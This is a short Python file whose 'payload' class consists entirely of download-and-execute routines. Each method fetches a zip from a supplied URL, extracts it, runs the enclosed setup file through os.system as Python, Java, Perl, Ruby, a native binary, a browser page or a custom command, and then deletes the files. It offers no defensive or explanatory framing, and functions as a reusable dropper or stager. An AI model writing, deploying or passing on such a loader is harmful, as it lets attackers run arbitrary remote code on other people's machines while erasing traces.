import urllib.request
from zipfile import ZipFile
import os
import importlib
import shutil
class payload:
    def python_payload(url):
        urllib.request.urlretrieve(url,"./master.zip")
        with ZipFile("master.zip","r") as ZipObj:
            ZipObj.extractall()
        os.remove("master.zip")
        os.system("python ./setup-master/setup.py")
        shutil.rmtree("setup-master") 
    def python3_payload(url):
        urllib.request.urlretrieve(url,"./master.zip")
        with ZipFile("master.zip","r") as ZipObj:
            ZipObj.extractall()
        os.remove("master.zip")
        os.system("python3 ./setup-master/setup.py")
        shutil.rmtree("setup-master")
    def python2_payload(url):
        urllib.request.urlretrieve(url,"./master.zip")
        with ZipFile("master.zip","r") as ZipObj:
            ZipObj.extractall()
        os.remove("master.zip")
        os.system("python2 ./setup-master/setup.py")
        shutil.rmtree("setup-master")
    def java_payload(url):
        urllib.request.urlretrieve(url,"./master.zip")
        with ZipFile("master.zip","r") as ZipObj:
            ZipObj.extractall()
        os.remove("master.zip")
        os.system("java -jar ./setup-master/setup.jar")
        shutil.rmtree("setup-master")
    def exe_payload(url):
        urllib.request.urlretrieve(url,"./master.zip")
        with ZipFile("master.zip","r") as ZipObj:
            ZipObj.extractall()
        os.remove("master.zip")
        os.system("./setup-master/setup.exe")
        shutil.rmtree("setup-master")
    def bat_payload(url):
        urllib.request.urlretrieve(url,"./master.zip")
        with ZipFile("master.zip","r") as ZipObj:
            ZipObj.extractall()
        os.remove("master.zip")
        os.system("java -jar ./setup-master/setup.bat")
        shutil.rmtree("setup-master")
    def elf_payload(url):
        urllib.request.urlretrieve(url,"./master.zip")
        with ZipFile("master.zip","r") as ZipObj:
            ZipObj.extractall()
        os.remove("master.zip")
        os.system("./setup-master/setup")
        shutil.rmtree("setup-master")
    def perl_payload(url):
        urllib.request.urlretrieve(url,"./master.zip")
        with ZipFile("master.zip","r") as ZipObj:
            ZipObj.extractall()
        os.remove("master.zip")
        os.system("perl ./setup-master/setup.pl")
        shutil.rmtree("setup-master")
    def ruby_payload(url):
        urllib.request.urlretrieve(url,"./master.zip")
        with ZipFile("master.zip","r") as ZipObj:
            ZipObj.extractall()
        os.remove("master.zip")
        os.system("ruby ./setup-master/setup.rb")
        shutil.rmtree("setup-master")
    def html_payload(url,browser):
        urllib.request.urlretrieve(url,"./master.zip")
        with ZipFile("master.zip","r") as ZipObj:
            ZipObj.extractall()
        os.remove("master.zip")
        os.system(browser+" ./setup-master/setup.html")
        shutil.rmtree("setup-master")
    def custom_payload(url,prefix,suffix):
        urllib.request.urlretrieve(url,"./master.zip")
        with ZipFile("master.zip","r") as ZipObj:
            ZipObj.extractall()
        os.remove("master.zip")
        os.system(prefix+" ./setup-master/setup."+suffix)
        shutil.rmtree("setup-master")
